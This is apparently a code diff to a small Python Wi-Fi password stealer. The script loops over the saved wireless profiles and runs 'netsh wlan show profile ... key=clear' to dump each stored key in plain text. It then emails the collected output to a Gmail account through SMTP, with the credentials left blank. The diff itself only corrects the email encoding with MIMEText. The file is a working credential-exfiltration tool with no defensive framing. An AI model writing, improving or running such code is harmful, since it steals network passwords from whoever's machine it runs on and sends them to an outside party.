@@ -1,12 +1,13 @@
 import subprocess, smtplib, re
+from email.mime.text import MIMEText
 
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
-
+    message = MIMEText(message, 'plain', 'utf-8')
     server.starttls()
     server.login(email, password)
-    server.sendmail(email, email, message)
+    server.sendmail(email, email, message.as_string())
     server.quit()
 
 
@@ -19,5 +20,6 @@ for network_name in network_names_list:
     command = "netsh wlan show profile " + network_name + " key=clear"
     current_result = subprocess.check_output(command, shell=True, encoding='866')
     result = result + current_result
+
 
 send_mail("@gmail.com", "", result.encode('utf-8'))  # gmail, password, massage
